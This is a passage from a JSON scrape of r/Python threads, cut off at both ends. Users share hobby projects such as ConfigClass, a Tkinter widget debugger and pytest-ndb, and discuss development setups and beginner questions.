            "content": "Hi everyone, I just coded a chat application tailored for family use. Motivated by the high costs associated with the team version of ChatGPT, I sought an alternative that uses the cost-effective OpenRouter API and OpenAI's API services. The app features: Conversational Memory: For more natural discussions. PDFChat: To easily talk about content in PDF documents. Image Generation: For creating images from text prompts. It was a personal project to better connect with my family, but I thought it might be helpful to others seeking similar solutions. If you’re interested, you can check it out here: Family Chat on GitHub I’m really hoping it can be useful to someone else, and I’m open to any feedback or suggestions. Thanks for checking it out!"
        },
        {
            "author": "0xe5e",
            "score": "3",
            "content": "Built an AI weather forecasting tooling repo on top of large weather models. They are like LLMs in the sense that it has been really painful to run & experiment with them. Any feedback welcome!"
        },
        {
            "author": "Priest-Pucci",
            "score": "2",
            "content": "heyo, recently made a personal budget tracker in python using oop it calculates the total saving,total expenses and annual income of a person. However im snot able to calculate the or truly depict the result of annual income rest all are working fine."
        },
        {
            "author": "Zaloog1337",
            "score": "2",
            "content": "Currently working on a Terminal User Interface (TUI) build with the great Textual package for Rye the relatively new project/package manager. If you want to try it out already you can find more infos here (github)."
        },
        {
            "author": "sffjunkie",
            "score": "2",
            "content": "2 things, the first is only Python related, a set of Just Files to manage my Python projects https://github.com/sffjunkie/justfiles/ and the second a command line tool to manage `.gitignore` files"
        },
        {
            "author": "notanamber",
            "score": "2",
            "content": "I have created a command line tool that tries to put together the find command with the tree command by generating a tree with the search results. This is a screenshot to get an idea how it works: vifind It is written completely in python (with the standard libraries) under the GPL licence, any advice/contribution is appreciated. The repository with the documentation can be found here"
        },
        {
            "author": "desgeeko",
            "score": "2",
            "content": "Working on a PDF library: https://github.com/desgeeko/pdfsyntax"
        },
        {
            "author": "printr_head",
            "score": "2",
            "content": "I'm working on a novel class of GA. When I say novel I mean it. no one has anything like this. Im still refining it and building up the frame work for easy testing and deployment. Right now its capable of transfer learning and incremental learning between runs. The framework is designed to work with discrete genes. just define the fitness class and the gene set and go. still refining things and fully understanding how the innerworkings play together. Working on getting everything set for a patent application."
        },
        {
            "author": "Kish010",
            "score": "2",
            "content": "Not sure if it counts but I'm working on using visualization llibraries in python to create an interactive visual of the the globe where each country can be clicked on to see FIfa20 players who are in the game and from that country."
        },
        {
            "author": "L4g4d0",
            "score": "1",
            "content": "A memecoin sniper bot (on Solana); hopefully I can buy a lambo soon /s"
        },
        {
            "author": "bb-wa",
            "score": "1",
            "content": "I'm trying to make a program with a timer, stopwatch and date calculator"
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "trying to roll out some platform improvements: logging, upgrading python versions across different projects, adding type hinting to all our systems and improving the database access layer/code - lots of generic type hinting (everything is a dict)"
        },
        {
            "author": "Financial-Ad7755",
            "score": "1",
            "content": "I am still trying to figure things out because i am new to programming,"
        },
        {
            "author": "doudou8310",
            "score": "1",
            "content": "In an ideal world, I would have an automatic web-form filling tool that could do the job in 0-2 seconds to get very highly coveted / very hard to get tickets... From researching a possible bot to do this today, it seems Python might be the right language to do that. the issue is that I know absolutely jack-shit about Python... Anyone here knowledgeable about something like this? PM me if so"
        }
    ]
},
{
    "post_author": "TheTerrasque",
    "post_id": "1chhm8x",
    "post_score": "22",
    "post_time": "Wednesday, May 1, 2024 at 12:11:56 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ConfigClass - simple dataclass inspired configuration",
    "media": [
        "https://github.com/TheTerrasque/python-configclass"
    ],
    "post_content": "What My Project Does\nI'm making a simple configclass for handling configuration in smaller projects and scripts. Goal is to be as simple to start with as creating a dataclass.\nThe module itself works off dataclass and when you use it you just define a dataclass as normal, but decorate it with @configclass() instead.\nExample:\nfrom configclass import configclass\n\n@configclass()\nclass Settings:\n    foo: bool = False\n    url: str = \"\"\n    footoo: bool = True\n    my_model: str = \"model.pt\"\n\nsetting = Settings.load()\n\nprint(setting.foo, setting.footoo, setting.my_model)\nFrom that you got\nJSON config file support (config.json)\nYAML config file support (config.yaml)\nCommand line support (argparse)\nEnv variables support (CONFIG_SETTINGNAME)\nIt also support nested structures via nested dataclass classes.\nComparison\nIt's meant as a quick and lightweight alternative to larger and more comprehensive config systems, for the small programs and scripts where you'd just use a dataclass, and maybe load the values from a config file.\nTarget Audience\nSince it's pretty new and raw I wouldn't recommend it for heavy production settings or complex projects. That said, it should work fine for most cases.\nWhile I've worked with python for quite some time, this is the first time I've tried making a package, so I'd like some feedback on the project and it's structure before I push it anywhere. It'd also be nice to stress test it and shake out some bugs.\nMore info and code at https://github.com/TheTerrasque/python-configclass",
    "comments": [
        {
            "author": "Intelligent_Ad_8148",
            "score": "11",
            "content": "What are the benefits of using this over pydantic (which also has dataclasses, json/yaml conversion, and env var support)?",
            "replies": [
                {
                    "author": "TheTerrasque",
                    "score": "4",
                    "content": "pydantic-settings is very nice, true. This aims to be even simpler, somewhere in between of using pydantic and nothing, and be a drop-in replacement for a dataclass config. Also, this provides command line argument parsing and loading from file configs by default, without any extra setup."
                }
            ]
        },
        {
            "author": "BossOfTheGame",
            "score": "4",
            "content": "I've written something similar, which is now a fairly mature project. If you want to take a look, I'm open to contributions if you have any ideas that might improve scriptconfig The main difference in a scriptconfig.DataConfig is that it doesn't rely on the type system. Instead it uses wrapped values to hold metadata, which ultimately ends up being a lot more extensible and introspectable. It can also create argparse CLIs (with Rich-argparse and argcomplete integration), serialize and deserialize from yaml or JSON, be used purely as a lightweight dictionary or namespace object, and it has decent support for modal CLIs. In the future I'd like to add more support for jsonargparsre. https://pypi.org/project/scriptconfig/",
            "replies": [
                {
                    "author": "TheTerrasque",
                    "score": "1",
                    "content": "Nice! Yeah, had a similar thought. I wanted something really simple, and usually when developing my progress goes like this: TOP_LEVEL_VARIABLES Move them into a dataclass for easier collection and editor completion Load from a file as I want some things out of GIT or want to experiment with different settings more quickly. Add command line for some parts because when developing and rapidly testing things changing options on a command line is super simple and straight forward. Want to deploy on docker or kubernetes and starting to read env vars. So after going down that path multiple times I just wanted to have something super simple that wrapped that path from the start, while being no more work than writing a dataclass. I have tried a few different ones I found via google, but it either felt too much boilerplate, or the approach was not what I was looking for. pydantic-settings is close, but I still feel it's a tad too much boilerplate for a simple project."
                }
            ]
        },
        {
            "author": "i_can_haz_data",
            "score": "2",
            "content": "Yet another implementation of this same concept. Our approach includes automatic expansion of values ending in _env or _eval in case you need to include secrets in the co figuration file. https://github.com/glentner/cmdkit"
        }
    ]
},
{
    "post_author": "SpeakerOk1974",
    "post_id": "1cguoiy",
    "post_score": "49",
    "post_time": "Tuesday, April 30, 2024 at 5:48:03 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Just an Appreciation Post for the Python Standard Library",
    "media": [],
    "post_content": "Approaching a year into my journey of learning Python (I come from a C background) I finally understand the beauty and ubiquity of the langauge. Initially, I was hesitant to learn a dynamically typed and interpreted language when job requirements required me to learn it (I help support a team of Power Systems Engineers, and our professional software uses python for scripting). My first attempts were extremely unpythonic and it felt like I was fighting the language (index based looping, declaring variables before use, C style procedural code on top of Pandas antipatterns) and the lack of brackets I found appalling. Then I had my first code review with a helpful Senior engineer. We refactored my code together and something beautiful came together. He then told me to read the Zen of Python. It was love at first \"import this\". I was hooked. Every waking moment for weeks I was learning all I could muster about python.\nNow later on in my journey, and having written several complex systems in python over the course of the past 6 months, it is truly incredible what you can accomplish with just the standard library. Need a temporary file? There is a module for that. Want to serialize data? Multiple modules just for that purpose. Embarrassingly parallel basic scripting tasks? 3 lines of code later and it is now multiprocessed. The list goes on and on.\nArchimedes once famously said \"Give me a lever long enough and a fulcrum on which to place it, and I shall move the world\". With an understanding of all that is available out of the box as the fulcrum so to speak, it is amazing the breadth of problems that the standard library proves to be a long enough lever. On our compute cluster, we try to keep dependencies to an absolute minimum. Sticking to the standard library, Pandas, and the provided API for the software with a clever enough implementation rarely if ever feels like a limitation.\nSo next time you feel the need to pip install something new, be sure to check the Python documentation. You just might already have all the tools you need already at your disposal!",
    "comments": [
        {
            "author": "sib_n",
            "score": "2",
            "content": "If you're doing compute intensive stuff, you may want to explore Polars as a more performant replacement for Pandas.",
            "replies": [
                {
                    "author": "SpeakerOk1974",
                    "score": "2",
                    "content": "I appreciate the suggestion! We have explored it for our larger datasets, but there was alot of existing Pandas code in several thousand plus line programs. Generally in the programs performance matters, Pandas isn't even close to the bottleneck compared to the complex numerical algorithms ran by the power system simulator. We would like to move to it eventually, but a good stopgap for us was switching to Parquet rather than CSV for a noticeable bump in read/write performance. Do you know if Polars plays nice with Cython by any chance?"
                }
            ]
        },
        {
            "author": "djcannut",
            "score": "1",
            "content": "He then told me to read the Zen of Python What's this ?",
            "replies": [
                {
                    "author": "darni01",
                    "score": "4",
                    "content": "https://peps.python.org/pep-0020/"
                },
                {
                    "author": "mvaliente2001",
                    "score": "3",
                    "content": "You can try in a python console import this"
                }
            ]
        },
        {
            "author": "Normal-Chemist-3247",
            "score": "1",
            "content": "I don’t use Python a ton, but every time I write Python I feel like the syntax is exactly what I’m expecting it to be. Really like it because of this."
        }
    ]
},
{
    "post_author": "ImportantDesk",
    "post_id": "gu9nzq",
    "post_score": "2086",
    "post_time": "Monday, June 1, 2020 at 2:42:52 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I configured my terminal to teach me a new word everyday! Every time I open a new terminal window, I have a python script that scrapes dictionary.com and gives me the word of the day. On top of that, I have a motivational quote displayed as well :)",
    "media": [
        "https://preview.redd.it/xutjmkkss6251.png?width=640&crop=smart&auto=webp&s=b0ddab8695cc497c9bbcbc855eafbecb00e3404c",
        "https://i.redd.it/xutjmkkss6251.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "I bought a thesaurus, it's been really good.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "I bought a thesaurus, it's been really good.",
                    "replies": [
                        {
                            "author": "Cryptokudasai",
                            "score": "7",
                            "content": "I bought a thesaurus, it's been really good."
                        }
                    ]
                },
                {
                    "author": "akkosh",
                    "score": "30",
                    "content": "He took shower quicker than you probably :)"
                }
            ]
        },
        {
            "author": "adielzakaria",
            "score": "155",
            "content": "My fav quote is by joe lycett \" life is like a box of chocolates it doesn't last long if you're fat\""
        },
        {
            "author": "Llamatree69",
            "score": "27",
            "content": "What terminal is that?? Its beautiful"
        }
    ]
},
{
    "post_author": "FeLoNy111",
    "post_id": "1cha1qy",
    "post_score": "4",
    "post_time": "Wednesday, May 1, 2024 at 4:40:02 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ext-message: Send files over Discord direct messages",
    "media": [
        "https://pypi.org/project/ext-message/",
        "https://github.com/jwjeffr/ext-message/"
    ],
    "post_content": "Hey all! I recently made a library for sending text files over Discord DMs\nhttps://pypi.org/project/ext-message/\nhttps://github.com/jwjeffr/ext-message/\nWhat my project does\nThis code is a command-line interface for sending text files to Discord DMs from a bot.\nTarget audience\nMy personal use-case is for my research, where I run long simulations (~72 hours) on a computing cluster. These simulations generate log files, so I can send myself the log file after the simulation, letting me:\n- Know that the simulation is done\n- Check that the simulation ran as intended\nwithout having to SSH into the cluster. As of now, those running similarly heavy code looking to be notified when it finishes is my target audience, but I would love to hear other creative use cases to expand that audience!\nComparison\nNot sure what's out there in terms of other libraries for doing similar things. This was partially for production and partially a toy project forcing me to become more familiar with discord.py",
    "comments": [
        {
            "author": "Child_immigration",
            "score": "1",
            "content": "Foom"
        }
    ]
},
{
    "post_author": "Starks-Technology",
    "post_id": "1cgdkcs",
    "post_score": "0",
    "post_time": "Tuesday, April 30, 2024 at 2:12:51 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "A Free GPT-Powered Financial Analysis Tool",
    "media": [
        "https://github.com/austin-starks/AI-Financial-Analysis"
    ],
    "post_content": "Link to GitHub Page\nWhat My Project Does\nI created a simple financial analysis tool using the SimFin API and the GPT API. This tool summarizes financial information and makes it digestable for people who don't know a lot about finance.\nTarget Audience\nThis is more of a toy project for those interested in AI and Finance. It's meant for people without a ton of GPT experience to see a tangible use-case of generative AI within the field.\nComparison\nEven though this is a simple tool, I don't know of any existing alternative.\nExample\nInput:\nAnalyze Apple's q1 2023 earnings\nOutput:\nAI Assistant: Based on the provided financial information, here is a summary of the company's finances:\nBalance Sheet:- Total Assets: $346,747,000,000- Total Liabilities: $290,020,000,000- Total Equity: $56,727,000,000The company has a strong balance sheet with a significant amount of assets compared to its liabilities. This indicates a healthy financial position.\nCash Flow:- Net Cash from Operating Activities: $34,005,000,000- Net Cash from Investing Activities: -$1,445,000,000- Net Cash from Financing Activities: -$35,563,000,000- Net Change in Cash: -$3,003,000,000The company generated positive cash flow from its operating activities, but had negative cash flow from investing and financing activities. As a result, there was a decrease in cash during the period.\nProfitability Metrics:- Gross Profit Margin: 42.96%- Operating Margin: 30.74%- Net Profit Margin: 25.61%- Return on Equity: 52.88%- Return on Assets: 8.65%- Return on Invested Capital: 15.28%The company has healthy profitability metrics, indicating efficient operations and good returns on investment.\nLiquidity Metrics:- Current Ratio: 1.01The company has a current ratio slightly above 1, which suggests it has enough current assets to cover its short-term liabilities. However, it is important to note that a current ratio of exactly 1 may indicate limited liquidity.\nSolvency Metrics:- Liabilities to Equity Ratio: 5.11- Debt Ratio: 32.04%The company has a relatively high liabilities to equity ratio, indicating a significant amount of debt compared to equity. The debt ratio is moderate, suggesting that a significant portion of the company's assets is financed by debt.\nCash Flow Metrics:- Free Cash Flow: $39,273,000,000- Free Cash Flow to Net Income: 1.31- Cash Return on Invested Capital: 17.77%The company has positive free cash flow, indicating its ability to generate cash after accounting for capital expenditures. The free cash flow to net income ratio suggests that the company is efficient in converting its net income into free cash flow. The cash return on invested capital is also positive, indicating good returns on the capital invested.\nOther Important Metrics:- Piotroski F-Score: 4- Net Debt / EBITDA: 1.53- Dividend Payout Ratio: 12.56%The Piotroski F-Score of 4 suggests that the company has a moderate financial strength. The net debt to EBITDA ratio indicates the company's ability to repay its debt, with a ratio of 1.53. The dividend payout ratio suggests that the company distributes a portion of its earnings as dividends.Based on the provided information, the company appears to be in a strong financial position with healthy profitability metrics and positive cash flow. However, it is important to conduct further research and analysis to fully understand the company's financial health and prospects.\nFeel free to fork it, make PRs for it,or leave feedback!",
    "comments": []
},
{
    "post_author": "TechDumbLogie",
    "post_id": "faf0zd",
    "post_score": "2083",
    "post_time": "Thursday, February 27, 2020 at 7:55:22 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I've created a python program that generates photomosaics from any dataset !",
    "media": [
        "https://i.redd.it/32qlya6gyhj41.png",
        "https://preview.redd.it/32qlya6gyhj41.png?width=640&crop=smart&auto=webp&s=a056883f0c1d672209bb19c0035bca62368cfc70"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "TechDumbLogie",
            "score": "142",
            "content": "I'll add the source code soon if people are interested ! Edit : Here it is !"
        },
        {
            "author": "mekosmowski",
            "score": "32",
            "content": "It is hard for me to see the animal. My brain wants to interpret this as a Dwarf Fortress embark map."
        },
        {
            "author": "brandondunbar",
            "score": "24",
            "content": "I used the Bulbasaur to make the Bulbasaur"
        },
        {
            "author": "MrFrostyBudds",
            "score": "16",
            "content": "Draw Jerry Seinfeld with every frame from Bee movie."
        },
        {
            "author": "bokononistmonkey",
            "score": "6",
            "content": "Hey, looks pretty cool! I wrote a similar program a while back in Processing (~~ easier to read Java) to run live on a webcam, using all the video frames from the Willie Wonka & the Chocolate Factory movie as the mosaic tiles. Meta mosaic of the Willy Wonka movie poster as proof: Mosaic. Fun times! If I may, I just want to give a few thoughts/suggestions: Converting the images to pixels by resizing to (1,1) is a smart move for sure, probably gets the same result as what I did, which was just calculating the r,g,&b average of all the pixels in the image to determine its pixel color as a tile. In the mosaic creation, it looks like you're selecting each pixel by minimizing the rgb diff, which looks like it works well, you might also consider doing it as the minimum euclidean distance (think Pythagorean theorem, but on the R, G, and B vals) between desired color (mosaic) and colors available (pixel list). When I was doing mine, I found that that was a bit more robust at finding the best color for each pixel, especially when there weren't any that were exactly the right color. Finally, if you're interested in speeding up the mosaic creation to be able to run faster or even live i.e. on a webcam or video, feel free to check out the github repo I've linked below. It's nothing too complicated, the big difference is the initial Dataset setup. Essentially, if you set up a simple data structure that groups all your pixel images into a bunch of small, similar-color buckets, then when you create each new mosaic image, for each new mosaic tile/pixel you just access the closest color bucket, and search the small group of pixel images inside it. Doing this makes each mosaic pixel search orders of magnitude faster (a fraction of O(n) ), while still guaranteeing the optimal pixel choice. Happy coding! Edit: got a few requests so here's a link to the code"
        },
        {
            "author": "Elite4alex",
            "score": "4",
            "content": "Happy pokemon day!"
        },
        {
            "author": "Herbal_Engineer",
            "score": "2",
            "content": "I’m interested to see it!"
        },
        {
            "author": "Abusagidolla",
            "score": "2",
            "content": "great job"
        },
        {
            "author": "virtualadept",
            "score": "2",
            "content": "Awesome! Github repo?"
        }
    ]
},
{
    "post_author": "Working_Noise_6043",
    "post_id": "1cib6to",
    "post_score": "88",
    "post_time": "Thursday, May 2, 2024 at 12:18:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What does your python development setup look like?",
    "media": [],
    "post_content": "I'd like to explore other people's setup and perhaps try need things or extra tools. What kind IDE, any extra tools to make it easier for you, etc. Looking forward to everyone's responses!",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "clueless_reponse",
            "score": "23",
            "content": "I keep it simple with neovim, pre-commit (mypy, ruff), pytest. For debugging I just use the breakpoint function.",
            "replies": [
                {
                    "author": "CopOnTheRun",
                    "score": "3",
                    "content": "Do you also have mypy/ruff integrated into neovim, or are they just pre-commit hooks? Also not sure if you have ipython installed, but it includes a pretty nice debugger (ipdb) compared to the default.",
                    "replies": [
                        {
                            "author": "clueless_reponse",
                            "score": "5",
                            "content": "I am using ruff-lsp but it doesn't support definitions. So you can't jump to one or see type hints. I am going to add none-lsp at some point but couldn't squeeze the time just yet. Thanks for pointing to ipdb, I'll try it out."
                        }
                    ]
                },
                {
                    "author": "snorkelvretervreter",
                    "score": "1",
                    "content": "Very similar here. pytest --pdb is 99% of my debugging."
                },
                {
                    "author": "Thagou",
                    "score": "1",
                    "content": "Did you try to see if your ruff lsp has the same results as ruff itself? I've been trying to move to neovim, I have a set up I like a lot, but even though everything is in the pyproject.toml, I get different result when using ruff in neovim compared to all other ways. Like in neovim, it tells me that some file need to have their imports reordered, but when using the command line or vscode, it does not.",
                    "replies": [
                        {
                            "author": "clueless_reponse",
                            "score": "1",
                            "content": "ruff-lsp uses the settings specified on editor-level (init.lua). The only lsp that respected project-level settings that I tried was null-lsp (which is abandoned so we are supposed to use none-lsp now). It was a bummer for me at first. But if you're using pre-commit, it's doesn't matter too much."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Jens_the_78th",
            "score": "17",
            "content": "For exploring datasets, plotting data, reading Excel files or accessing databases I use jupyter. For other projects I use PyCharm IDE"
        },
        {
            "author": "OsamaBeenLaggingg",
            "score": "33",
            "content": "Vscode for normal coding /projects stuff Thonny for DSA (very good debugger)"
        },
        {
            "author": "ocus",
            "score": "61",
            "content": "PyCharm, poetry, pyenv, isort, black, mypy.",
            "replies": [
                {
                    "author": "Sockslitter73",
                    "score": "28",
                    "content": "This is me :P although I have recently leaned more towards ruff for linting and formatting (its sooo fast)"
                }
            ]
        },
        {
            "author": "Ancient-Camel1636",
            "score": "20",
            "content": "1.VSCode with the following plugins: Codeium (or Continue with Ollama/Deepseek Coder for when I must work offline) Python and Python debugger (from Microsoft) Python Environment Manager (by Don Jayamanne) Snippets(by Taha BASRI) 2. Zed Attack Proxy (ZAP) for software security testing 3. DBeaver for database management 4. GIT GUI (by Shawn O. Pearce) 5. MySQL And lately, I have been experimenting with these quite interesting inventions: Brython, a Python replacement for Javascript on the Web. PyScript | Run Python in your HTML. Pyston | Python Performance (support only up to 3.10)"
        },
        {
            "author": "pyhannes",
            "score": "6",
            "content": "PyCharm pro, Hatch, UV, ruff, pre commit."
        },
        {
            "author": "odaiwai",
            "score": "6",
            "content": "For Windows: VSCode for editing code (I probably have too many plugins/extensions) NotePad++ for reviewing output and print files (One of the scripting languages I use puts the script in the print file, and the number of times I've fixed a bug in the print file is frankly embarrassing...) Running Code, depends on the project - mostly Cygwin shell, or within an application. For Linux/macOS: Coding in Vim/GVim for editing for Python/Perl/Shell, but sometimes VSCode as well. I use Xcode for Swift. Running code from the command line for python, in Xcode for Swift. The most useful tools is probably an Opinionated Linter (I use Ruff and AutoPep8, and a decent autocomplete engine that shows the function details for functions calls."
        },
        {
            "author": "Kolbenwetzer",
            "score": "7",
            "content": "Mostly Spyder. And for displaying outputs to colleagues Jupyter Notebook, as it makes it easier for them to understand which output corresponds to which part of the code and it does not just look like a block of code"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ch7whw",
    "post_score": "5",
    "post_time": "Wednesday, May 1, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Tony_Gunk_o7",
            "score": "3",
            "content": "For those of y'all using Python as a backend for Web Dev, what's your preferred front end to use with Python? And why?",
            "replies": [
                {
                    "author": "monorepo",
                    "score": "2",
                    "content": "I like just TailwindCSS and Jinja2 templates lately. Not a whole lot of learning curve for onboarding users and no JS framework mess. Throw in HTMX and there’s not a whole lot you can’t do. Although I have been really enjoying the power of Vite paired with Vue or React lately."
                }
            ]
        },
        {
            "author": "Tony_Gunk_o7",
            "score": "3",
            "content": "For those not using Python for Web Dev; what kind of things are you using Python for?",
            "replies": [
                {
                    "author": "qazbarf",
                    "score": "2",
                    "content": "I am currently using python to emulate an IMLAC graphical minicomputer and write an assembler and disassembler for it, write a simple full-screen text editor and various small tools to do things like: shuffle the videos on a memory stick because my TV doesn't have a \"random play\" feature move and stretch/shrink subtitle .SRT files because it's sometimes hard to find the correct .SRT file for a movie backup various laptop directories and external drives to dedicated \"backup\" external drives many other trivial tasks In the past I used python to help manage a small scientific research compute cloud, maintained a system to simulate the effects of tsunamis on a coastline, wrote tools to help scientists and engineers estimate and model damage caused by earthquakes, wind, volcanic ash-fall, flooding, etc."
                }
            ]
        },
        {
            "author": "Bullets123",
            "score": "2",
            "content": "I'm working on a personal project, which in summary does the following - Take input and output file path Checks input file path for pdf Parses the pdf for neccessary info Exports the neceessary info in output file path as excel I made a tkinter GUI for it, which allows adding input and output file path. A final \"Submit\" button which runs the parsepdf() function. def parsepdf(): submit_button['state'] = 'disabled' # do the parsing # export to excel root = tk.Tk() submit_button = ttk.Button( root, text=\"Submit\", command=parsepdf, ) root.mainloop() The issue - The first line in the parsepdf() function is submit_button['state'] = 'disabled' However the parsing is done and the entire function is run but the submit_button only disables after the entire function is run, instead of as soon as the function starts.",
            "replies": [
                {
                    "author": "Rawing7",
                    "score": "2",
                    "content": "Your program can only do one thing at a time - while it's busy parsing the PDF, it can't update the GUI. The solution is to do the parsing in a thread. But the problem with that is that tkinter isn't thread-safe, so you mustn't modify the GUI from within the thread. Tkinter is a terrible GUI framework, I strongly recommend switching to something else."
                }
            ]
        },
        {
            "author": "All-the-Feels333",
            "score": "2",
            "content": "I’m learning in my python on the side. Eventually I might pay for some in depth courses but now just consuming all the free content I can find online. In the next couple years I would like to be able to work in coding/IT, is this a viable goal? Any tips? Is the job marked looking good or grim? I am fairly aware of tech and things being an amateur music producer, I just want to move out of the machining industry I’m in and towards tech."
        },
        {
            "author": "wineblood",
            "score": "1",
            "content": "What's the best practice for pytest fixtures? I'm working on a repo where fixtures call other fixtures and everything seems so implicit, seems like there should be a good approach I'm not seeing."
        },
        {
            "author": "Vandercoon",
            "score": "1",
            "content": "Is there a way to automate virtual environments? I know I should be using them, I get the advantage, but setting up and activating each the time skips my brain."
        },
        {
            "author": "Icy-Direction-8058",
            "score": "1",
            "content": "What would be the correct answer for this question? Select the call that would correctly format and print the message: \"Hello John Doe, welcome to Python 3.9!\" def greet(*args, **kwargs): message = \" \" join(args) + message += \"welcome to \" + \" \" join(f'k} (v)\" for k, v in kwargs.items()) + \"|\" print(message) greet(\"Hello\", \"John Doe\", Python=\"3.9\") greet(\"Hello\", \"John Doe\", language= \"Python\", version=\"3.9\") greet(\"Hello\", name=\"John Doe\", language= \"Python\", version=\"3.9\") greet(\"Hello\", \"John\", \"Doe\", version=\"3.9\", language=\"Python\")"
        }
    ]
},
{
    "post_author": "SleekEagle",
    "post_id": "1cinnql",
    "post_score": "6",
    "post_time": "Thursday, May 2, 2024 at 9:57:37 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Tutorial on Building a Server-to-Server Zoom App with Python",
    "media": [
        "https://www.assemblyai.com/blog/zoom-transcription-zoom-api/?utm_source=youtube&utm_medium=referral&utm_campaign=yt_ry_8",
        "https://github.com/AssemblyAI-Examples/assemblyai-zoom-transcripts",
        "https://www.youtube.com/watch?v=sQVliRl5uKw"
    ],
    "post_content": "I made a tutorial on how to build a server-to-server Zoom OAuth application using Python. This application can transcribe Zoom meeting recordings, print the transcripts to the terminal, and save the transcripts as text files.\nvideo tutorial\nrepo\nwritten tutorial\nThis tutorial covers:\nSetting up OAuth authentication for server-to-server apps\nUtilizing the Zoom API to access recordings\nImplementing automatic transcription using Python",
    "comments": []
},
{
    "post_author": "254hypebeast",
    "post_id": "1cf8fsp",
    "post_score": "102",
    "post_time": "Sunday, April 28, 2024 at 6:02:21 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Tkinter \"DevTools\" to inspect and modify widgets in your running app in real-time",
    "media": [
        "https://pypi.org/project/formation-studio/",
        "https://github.com/ObaraEmmanuel/Formation"
    ],
    "post_content": "source: https://github.com/ObaraEmmanuel/Formation\npypi: https://pypi.org/project/formation-studio/\nWhat My Project Does\nAllows you to inspect widgets in your running Tk app in real-time. You can view the widget hierarchy, modify widget attributes, adjust widget layout and run arbitrary code to interact with your widgets through the embedded Python REPL console. It works just like DevTools in a browser. This debugger is part of the Formation studio project which is a drag-n-drop graphical UI builder for Tkinter.\nTarget Audience\nAny Tk developer seeking to have an easier time debugging their UI or seeking to experiment with the Tk framework with minimal effort.\nComparison\nThere is no project currently doing this same thing.\nUsage\nIt comes bundled with Formation Studio so the installation is as simple as\npip install formation-studio\nYou don't have to change anything in your code. Simply use the following command and the debugger will attach itself to your app:\nformation-dbg /path/to/your/tk/app.py\nIn the embedded python REPL console you can access a simple debugger API as follows:\n# Access a list of all widgets currently selected\nwidgets = debugger.selection\n\n# Access the root widget usually a Tk object\nroot = debugger.root",
    "comments": [
        {
            "author": "254hypebeast",
            "score": "9",
            "content": "Here is a demo video for quick reference. It is a work in progress so contributions and feature requests are welcome.",
            "replies": [
                {
                    "author": "micseydel",
                    "score": "3",
                    "content": "I'm on mobile so not taking a deep look at this quite yet but it reminds me of https://youtu.be/PUv66718DII?si=jeVYbia2WzufsW_8"
                }
            ]
        },
        {
            "author": "asielen",
            "score": "9",
            "content": "This is really cool. Tkinter doesn't get enough love from the community. Sure the defaults are dated but it is pretty easy to use and change the themes. I think it just suffers from a lack of modern support tools and examples.",
            "replies": [
                {
                    "author": "254hypebeast",
                    "score": "4",
                    "content": "Couldn't agree more. It's why I embarked on this labor of love to create tools like these that allow Tk to still be a viable option."
                }
            ]
        },
        {
            "author": "HerbyHoover",
            "score": "4",
            "content": "Great work!"
        },
        {
            "author": "winches-",
            "score": "3",
            "content": "This looks awesome, I love the cnc interface even better!",
            "replies": [
                {
                    "author": "254hypebeast",
                    "score": "2",
                    "content": "It's one of the most complex Tk apps that I could find to test the tool on. You can check out its source on github.",
                    "replies": [
                        {
                            "author": "winches-",
                            "score": "3",
                            "content": "Thats impressive! I love seeing machinist stuff on these type of things"
                        }
                    ]
                }
            ]
        },
        {
            "author": "kuttoos",
            "score": "3",
            "content": "super cool"
        },
        {
            "author": "KocetoA",
            "score": "3",
            "content": "It needed that for a LONG time thanks man! You are a lifesaver :)"
        },
        {
            "author": "ekhazan",
            "score": "4",
            "content": "Looks very nice. Is there a way to use this in conjunction with modern flavors of tkinter like customtkinter?",
            "replies": [
                {
                    "author": "254hypebeast",
                    "score": "4",
                    "content": "I am currently working on exactly that. It kinda works but not in a useful way. It will show the underlying tk widgets making up a customtkinter widget, but you can't use the custom properties it provides."
                }
            ]
        }
    ]
},
{
    "post_author": "rhshadrach",
    "post_id": "1ch5e3g",
    "post_score": "4",
    "post_time": "Wednesday, May 1, 2024 at 1:09:26 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pytest-ndb - debugging pytest tests in a notebook",
    "media": [
        "https://github.com/rhshadrach/pytest-ndb"
    ],
    "post_content": "What My Project Does: Allows users to run a pytest test from a notebook or other REPL and capture local variables for inspection / debugging. While I think users should very often prefer debugging tests with a debugger, in certain situations where one deals with a nontrivial amount of data or many complex objects, being able to inspect and manipulate objects in a notebook can be helpful.\nTarget Audience: Primarily data scientists, but more generally anyone who tests with large/complex objects that can be difficult to understand in a debugger.\nComparison: I'm not aware of any alternatives, other than copy-and-pasting your pytest tests in a notebook.\nRepo with examples: https://github.com/rhshadrach/pytest-ndb",
    "comments": [
        {
            "author": "CcntMnky",
            "score": "2",
            "content": "Can you elaborate on the use case? I understand the need to debug a notebook. I understand the need to debug a pytest. Why would the pytest be in the notebook?",
            "replies": [
                {
                    "author": "rhshadrach",
                    "score": "1",
                    "content": "The test itself lives in a backend codebase that you're developing. The ability to debug failing test in a notebook allows you to take advantage of the features of a notebook. In data science, it can be the case that understanding why a test is failing takes some analysis. It's not uncommon that I end up with 20 lines of code to analyze the data involved in a test to understand what's going wrong. Trying to do the same thing in a debugger can be painful. Plus, you can take advantage of visualizations."
                }
            ]
        }
    ]
},
{
    "post_author": "ase1590",
    "post_id": "a7dcnk",
    "post_score": "2078",
